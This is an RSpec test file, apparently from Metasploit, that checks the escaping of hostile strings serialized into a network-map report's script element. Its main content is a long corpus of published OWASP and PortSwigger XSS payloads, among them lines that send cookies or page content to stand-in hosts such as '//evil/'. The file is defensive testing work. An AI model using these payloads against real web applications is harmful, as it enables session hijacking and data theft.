require 'spec_helper'

# Output-encoding coverage for Msf::Auxiliary::NetworkGraphBuilder#inline_json,
# which serializes attacker-influenced database strings (hostnames, SNMP
# values, loot/vuln info, credential usernames, ...) into a <script> element
# of the network_map report.
#
# Vector corpus drawn from:
#   - OWASP XSS Filter Evasion Cheat Sheet
#     https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
#   - PortSwigger Web Security Academy XSS Cheat Sheet (2026 edition)
#     https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
#
# Context note: a vector embedded as data can only execute by first escaping
# the JSON string it was serialized into, and JSON string syntax is a subset
# of JavaScript string-literal syntax.  Therefore "JSON.parse succeeds and
# returns the input unchanged" proves the equivalent JS literal binds the
# exact same string and nothing executes.  The companion property "output
# contains no raw < > or &" kills tag injection, event-handler attributes,
# consuming-tag breakouts, dangling markup and comment tricks wholesale,
# independent of which specific vector is used.
RSpec.describe Msf::Auxiliary::NetworkGraphBuilder do
  subject(:builder) { Object.new.extend(described_class) }

  let(:line_sep) { [0x2028].pack('U') }
  let(:next_line) { [0x2029].pack('U') }

  describe '#inline_json' do
    it 'leaves benign data untouched' do
      nodes = [{ 'label' => 'web01.corp.local', 'address' => '10.1.2.3', 'port' => 443, 'active' => true }]
      expect(builder.inline_json(nodes)).to eq(nodes.to_json)
    end

    it 'escapes every markup-significant character' do
      json = builder.inline_json(label: '<svg onload=alert(1)> & </textarea>')
      expect(json).not_to match(/[<>&]/)
    end

    it 'escapes the U+2028/U+2029 line separators' do
      json = builder.inline_json(text: "a#{line_sep}b#{next_line}c")
      expect(json).not_to include(line_sep)
      expect(json).not_to include(next_line)
      expect(json).to include('\u2028')
      expect(json).to include('\u2029')
    end

    it 'cannot terminate the containing script element' do
      breakout = '</script><script>alert(1)</script>'
      html = "<script>var NODES = #{builder.inline_json(label: breakout)};</script>"
      # The only raw <script opener and </script closer in the document are
      # the ones the template itself supplies.
      expect(html.scan(/<script\b/).length).to eq(1)
      expect(html.scan('</script').length).to eq(1)
    end

    it 'round-trips hostile values through JSON.parse unchanged' do
      hostile = {
        'name' => '</script><script>alert(1)</script>',
        'username' => 'CORP\\admin"',
        'attr_injection' => '" onmouseover="alert(1)',
        'element_injection' => "'><svg onload=x>",
        'line_sep' => "a#{line_sep}b"
      }
      expect(JSON.parse(builder.inline_json(hostile))).to eq(hostile)
    end

    it 'keeps backslash-containing values as valid JSON' do
      json = builder.inline_json(path: 'C:\\loot\\creds.txt')
      expect(JSON.parse(json)['path']).to eq('C:\\loot\\creds.txt')
    end

    it 'handles nested structures and non-string leaves' do
      data = { 'nodes' => [1, nil, true, { 'label' => '<' }], 'count' => 2 }
      expect(JSON.parse(builder.inline_json(data))).to eq(data)
    end

    it 'returns valid UTF-8' do
      json = builder.inline_json(text: '<b>caf' + [0xe9].pack('U'))
      expect(json.encoding).to eq(Encoding::UTF_8)
      expect(json).to be_valid_encoding
    end

    # ------------------------------------------------------------------
    # Cheat-sheet corpus.  Every entry below is a published vector from one
    # of the two referenced cheat sheets; each is asserted to serialize
    # with no raw < > & (so no element, attribute or comment breakout is
    # possible) and to round-trip byte-identically through JSON.parse
    # (so no JS string breakout is possible).
    # ------------------------------------------------------------------
    describe 'XSS cheat-sheet corpus' do
      let(:xss_payloads) do
        ls = line_sep
        nl = next_line
        nul = [0x00].pack('U')
        [
          # -- OWASP "Basic XSS Test" / "Malformed ... Tags" / "No Closing
          #    Script Tags" / "Protocol Resolution" / "Extraneous Open
          #    Brackets" / "HTML Quote Encapsulation"
          '<SCRIPT SRC=https://xss.rocks/xss.js></SCRIPT>',
          '<SCRIPT/SRC="http://xss.rocks/xss.js"></SCRIPT>',
          '<SCRIPT/XSS SRC="http://xss.rocks/xss.js"></SCRIPT>',
          '<<SCRIPT>alert("XSS");//<</SCRIPT>',
          '<SCRIPT SRC=//xss.rocks/.j>',
          '<SCRIPT SRC=http://xss.rocks/xss.js?< B >',
          '<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://xss.rocks/xss.js"></SCRIPT>',
          '<SCRIPT a=">" SRC="httx://xss.rocks/xss.js"></SCRIPT>',
          %q{<SCRIPT "a='>'" SRC="httx://xss.rocks/xss.js"></SCRIPT>},

          # -- OWASP event-handler / element vectors (IMG, BODY, SVG, META,
          #    IFRAME, FRAME, TABLE, DIV, STYLE, LINK, OBJECT, XML islands)
          '<IMG """><SCRIPT>alert("XSS")</SCRIPT>"\>',
          '<IMG SRC=# onmouseover="alert(1)">',
          '<IMG SRC= onmouseover="alert(1)">',
          '<IMG onmouseover="alert(1)">',
          '<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>',
          %q{<IMG SRC='vbscript:msgbox("XSS")'>},
          '<BODY ONLOAD=alert(1)>',
          '<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(1)>',
          '<svg/onload=alert(1)>',
          '<INPUT TYPE="IMAGE" SRC="javascript:alert(1);">',
          '<BGSOUND SRC="javascript:alert(1);">',
          '<BR SIZE="&{alert(1)}">',
          '<BASE HREF="javascript:alert(1);//">',
          '<OBJECT TYPE="text/x-scriptlet" DATA="http://xss.rocks/scriptlet.html"></OBJECT>',
          '<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert(1);">',
          '<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">',
          '<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert(1)</SCRIPT>">',
          '<IFRAME SRC="javascript:alert(1);"></IFRAME>',
          '<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>',
          '<FRAMESET><FRAME SRC="javascript:alert(1);"></FRAMESET>',
          '<TABLE BACKGROUND="javascript:alert(1)">',
          '<DIV STYLE="background-image: url(javascript:alert(1))">',
          '<DIV STYLE="width: expression(alert(1));">',
          %q{<STYLE>@import'http://xss.rocks/xss.css';</STYLE>},
          '<STYLE>li {list-style-image: url("javascript:alert(1)");}</STYLE><UL><LI>XSS</br>',
          '<IMG STYLE="xss:expr/*XSS*/ession(alert(1))">',
          '<XSS STYLE="xss:expression(alert(1))">',
          '<XSS STYLE="behavior: url(xss.htc);">',
          '<LINK REL="stylesheet" HREF="javascript:alert(1);">',
          '<!--[if gte IE 4]><SCRIPT>alert(1);</SCRIPT><![endif]-->',
          %q{<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://xss.rocks/xss.js></SCRIPT>'"-->},
          %q{<? echo('<SCR)'; echo('IPT>alert("XSS")</SCRIPT>'); ?>},
          '<XML ID=xss><I><B><IMG SRC="javas<!-- -->cript:alert(1)"></B></I></XML>',
          '<t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>alert(1)</SCRIPT>">',

          # -- OWASP "Character References": decimal, padded decimal and hex
          #    entity encodings with and without semicolons
          '<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">x</a>',
          '<a href="&#0000106&#0000097&#0000118&#0000097&#0000118&#0000097">x</a>',
          '<a href="&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x31&#x29">x</a>',
          '<a href="jav&#x09;ascript:alert(1);">x</a>',
          '<a href="jav&#x0A;ascript:alert(1);">x</a>',
          '<a href="jav&#x0D;ascript:alert(1);">x</a>',
          '<a href=" &#14;  javascript:alert(1);">x</a>',

          # -- OWASP "Null byte" and "US-ASCII encoding" / UTF-7 style charset
          #    tricks (the bytes are inert data unless a decoder honors them)
          "<IMG SRC=java#{nul}script:alert(1)>",
          '¼script¾alert(¢XSS¢)¼/script¾',
          '+ADw-script+AD4-alert(1)+ADw-/script+AD4-',
          '+/v8 +ADw-script+AD4-alert(1)+ADw-/script+AD4-',

          # -- OWASP "Character Escape Sequences": JavaScript escapes of <
          '\\x3c/script\\x3e',
          '\\u003cscript\\u003e',

          # -- OWASP "Escaping JavaScript Escapes" (the script-string
          #    breakout class) and "End Title Tag"
          %q{\";alert(1);//},
          '</script><script>alert(1);</script>',
          '</script><img src=x onerror=alert(1)>',
          '</TITLE><SCRIPT>alert(1);</SCRIPT>',

          # -- OWASP "URL String Evasion": base64 eval/atob and protocol tricks
          %q{<img onload="eval(atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9saXN0ZXJuSVAvIitkb2N1bWVudC5jb29raWU='))">},
          '<A HREF="//xss.rocks/.j">XSS</A>',

          # -- OWASP "Methods to Bypass WAF" strings
          '<Img src = x onerror = "javascript: window.onerror = alert; throw XSS">',
          '<Video> <source onerror = "javascript: alert (XSS)">',
          '<applet code="javascript:confirm(document.cookie);">',
          '<isindex x="javascript:" onmouseover="alert(1)">',
          '<isindex type=image src=1 onerror=alert(1)>',
          '<img src=x:alert(alt) onerror=eval(src) alt=0>',
          %q{<img src="x:gif" onerror="window['al\u0065rt'](0)"></img>},
          '<iframe/src="data:text/html,<svg onload=alert(1)>">',
          '<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>',
          %q{"></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>},
          '"><img src="x:x" onerror="alert(1)">',
          '"><iframe src="javascript:alert(1)">',
          '<object data="javascript:alert(1)">',

          # -- OWASP "XSS Locator (Polyglot)"
          %q{javascript:/*--></title></style></textarea></script></xmp> <svg/onload='+/"`/+/onmouseover=1/+/[*/[]/+alert(42);//'>},

          # -- PortSwigger event-handler families: page lifecycle, animation,
          #    SVG, media/data URIs, focus, hidden elements, user interaction,
          #    Safari/Chrome-only handlers (one representative vector each;
          #    every one still needs a raw '<' to open its element)
          '<body onload=alert(1)>',
          '<body onhashchange="print()">',
          '<style>@keyframes x{}</style><xss style="animation-name:x" onanimationstart="alert(1)"></xss>',
          '<xss autofocus style=transition:1s ontransitionend=alert(1) tabindex=1>',
          '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
          '<audio src/onerror=alert(1)>',
          '<audio autoplay onloadedmetadata=alert(1)><source src=validaudio.wav type=audio/wav></audio>',
          '<video><track default oncuechange=alert(1) src="data:text/vtt,WEBVTT"></video>',
          '<a id=x tabindex=1 onfocus=alert(1)></a>',
          '<xss onblur=alert(1) id=x tabindex=1 style=display:block>test</xss><input value=clickme>',
          '<xss id=x onbeforematch=alert(1) hidden=until-found>',
          '<xss oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto>',
          '<xss onsecuritypolicyviolation=alert(1)>XSS</xss>',
          'x<template shadowrootmode=open><slot onslotchange=alert(1)>',
          '<input onauxclick=alert(1)>',
          '<xss onclick="alert(1)" style=display:block>test</xss>',
          '<a onbeforecopy="alert(1)" contenteditable>test</a>',
          '<xss contenteditable onbeforeinput=alert(1)>test',
          '<input type=file oncancel=alert(1)>',
          '<input onchange=alert(1) value=xss>',
          '<xss draggable="true" ondrag="alert(1)" style=display:block>test</xss>',
          '<button popovertarget=x>Click</button><xss onbeforetoggle=alert(1) popover id=x>x</xss>',
          "<body onbeforeunload=navigator.sendBeacon('//evil/',document.body.innerHTML)>",

          # -- PortSwigger "Script consuming tag" (the core breakout for
          #    this context; full family generated below as well)
          %q{<script><img title="</script><img src onerror=alert(1)>"></script>},
          '<script>eval(myUndefVar);var inject="INJECTION_STARTS_HERE";var myUndefVar;alert(1);//";</script>',

          # -- PortSwigger restricted-characters / no-parentheses / JS
          #    obfuscation vectors
          '<script>onerror=alert;throw 1</script>',
          '<script>{onerror=alert}throw 1</script>',
          '<script>throw[onerror]=[alert],1</script>',
          '<script>var{a:onerror}={a:alert};throw 1</script>',
          %q{<script>throw onerror=eval,'=alert\x281\x29'</script>},
          '<script>alert`1`</script>',
          '<script>eval(atob`alert(1)`)</script>',
          '<video><source onerror=location=/\\02.rs/+document.cookie></video>',
          '<svg onload=alert(1)',
          '<svg onload=alert(1)<!--',
          '<script>new Function`X${document.location.hash.substr`1`}`</script>',
          '<SCRIPT SRC=HTTPS://PORTSWIGGER-LABS.NET/A.JS></SCRIPT>',
          %q{<script>window.name='javascript:alert(1)';</script><svg onload=location=name>},

          # -- PortSwigger js_string_single/js_string_double breakout class
          #    (identical threat to our JSON strings: quoting must hold)
          "'-prompt(1)-'",
          "'-window['a'+'lert'](1)-'",
          %q{'-self['\x61'+'lert'](1)-'},
          "';throw onerror=alert,1;'",
          "'-atob.constructor('a'+'lert(1)')()-'",
          "'-[location=name]-'",
          "'-[location='javascript:alert%281%29']-'",
          "'-''.constructor.constructor('a'+'lert(1)')()-'",
          "'-alert`1`-'",
          "'#{ls}throw onerror=alert,1#{ls}'",
          "'#{nl}throw onerror=alert,1#{nl}'",

          # -- PortSwigger attribute breakout and javascript: scheme vectors
          '"/onfocus=alert(1) tabindex=1 autofocus/',
          '1 onfocus=alert(1) autofocus/',
          '"onfocus="alert(1)"/autofocus/',
          "'><svg onload=x>",
          'javascript:alert(1)',
          'javascript&colon;alert(1)',
          'javascript&#58;alert(1)',
          'java&Tab;script:alert(1)',
          '&#1;javascript:alert(1)',
          '<iframe srcdoc="&lt;img src=1 onerror=alert(1)&gt;"></iframe>',
          '<script src="data:text/javascript,alert(1)"></script>',
          '<svg><script href="data:text/javascript,alert(1)" />',
          %q{<script>import('data:text/javascript,alert(1)')</script>},

          # -- PortSwigger dangling markup / exfiltration vectors
          '<img src="//evil?',
          '<body background="//evil?',
          '<meta http-equiv="refresh" content="0; http://evil?',
          '<link rel=stylesheet href="//evil?',
          '<form><button formaction=//evil>XSS</button><textarea name=x>',

          # -- PortSwigger polyglots
          %q{jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e},

          # -- PortSwigger framework CSTI payloads (the report ships no JS
          #    framework; included for defense in depth)
          "{{constructor.constructor('alert(1)')()}}",
          "'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');//",

          # -- PortSwigger prototype pollution via storage (defense in depth)
          "Object.prototype.sourceURL = '\\u2028\\u2029alert(1)'"
        ]
      end

      it 'neutralizes every vector (no raw markup chars, values intact)' do
        xss_payloads.each do |payload|
          json = builder.inline_json(x: payload)
          aggregate_failures "vector #{payload[0, 48].inspect}" do
            expect(json).not_to match(/[<>&]/)
            expect(json).not_to include(line_sep)
            expect(json).not_to include(next_line)
            expect(JSON.parse(json)['x']).to eq(payload)
          end
        end
      end

      it 'covers the full PortSwigger consuming-tag family' do
        %w[script noembed noscript style iframe xmp textarea noframes title].each do |tag|
          payload = "<#{tag}><img title=\"</#{tag}><img src onerror=alert(1)>\"></#{tag}>"
          json = builder.inline_json(x: payload)
          html = "<script>var NODES = #{json};</script>"
          aggregate_failures "consuming tag #{tag}" do
            expect(json).not_to include('<')
            expect(html.scan('</script').length).to eq(1)
            expect(JSON.parse(json)['x']).to eq(payload)
          end
        end
      end
    end

    # OWASP "Character References" relied on the victim browser decoding
    # entities at the injection point.  Escaping & prevents any second
    # decode: entity payloads survive as literal text.
    it 'double-encodes entity payloads so they stay inert text' do
      payload = '&lt;img src onerror=alert(1)&gt;'
      json = builder.inline_json(x: payload)
      expect(json).not_to include('&')
      expect(JSON.parse(json)['x']).to eq(payload)
    end

    # PortSwigger Encoding section: overlong UTF-8 forms of '<' must be
    # scrubbed before serialization so no decoder confusion can smuggle one.
    it 'scrubs overlong UTF-8 encodings of <' do
      overlong_lt = [0xC0, 0xBC].pack('C*').force_encoding('UTF-8') # %C0%BC
      json = builder.inline_json(x: overlong_lt)
      expect(json).not_to include('<')
      expect(JSON.parse(json)['x']).to eq('??')
    end
  end

  describe '#find_pivot_for_host circular-route prevention (PR review)' do
    let(:host_struct) { Struct.new(:address, :id) }

    it 'never resolves a host to a pivot route announced by itself' do
      pivot = host_struct.new('172.28.57.10', 7)
      routes = { '172.28.57.0/255.255.255.0' => 7 }
      expect(builder.send(:find_pivot_for_host, pivot, routes)).to be_nil
    end

    it 'still resolves other hosts behind the pivot' do
      target = host_struct.new('172.28.57.20', 9)
      routes = { '172.28.57.0/255.255.255.0' => 7 }
      expect(builder.send(:find_pivot_for_host, target, routes)).to eq(7)
    end

    it 'returns nil for hosts outside every routed subnet' do
      target = host_struct.new('10.0.0.5', 9)
      routes = { '172.28.57.0/255.255.255.0' => 7 }
      expect(builder.send(:find_pivot_for_host, target, routes)).to be_nil
    end
  end

  describe '#utf8_sanitize' do
    it 're-encodes binary strings as scrubbed valid UTF-8' do
      out = builder.utf8_sanitize(0xff.chr + 0xfe.chr)
      expect(out.encoding).to eq(Encoding::UTF_8)
      expect(out).to be_valid_encoding
    end

    it 'replaces invalid bytes with ?' do
      expect(builder.utf8_sanitize("ok#{0xff.chr}bad")).to eq('ok?bad')
    end

    it 'recurses through hashes and arrays' do
      input = { 'hash' => { 'inner' => 0xff.chr }, 'array' => [0xfe.chr] }
      out = builder.utf8_sanitize(input)
      expect(out['hash']['inner']).to eq('?')
      expect(out['array'][0]).to eq('?')
    end

    it 'leaves valid UTF-8 strings untouched' do
      input = 'host-01.example.com'
      expect(builder.utf8_sanitize(input)).to eq('host-01.example.com')
    end

    it 'does not mutate its input' do
      raw = 0xff.chr
      input = { 'x' => raw }
      builder.utf8_sanitize(input)
      expect(input['x']).to equal(raw)
      expect(input['x'].encoding).to eq(Encoding::ASCII_8BIT)
    end

    it 'feeds scrubbed output to JSON.generate without raising' do
      expect { builder.inline_json(key: 0xff.chr + 0x00.chr + 0xfe.chr) }.not_to raise_error
    end
  end
end
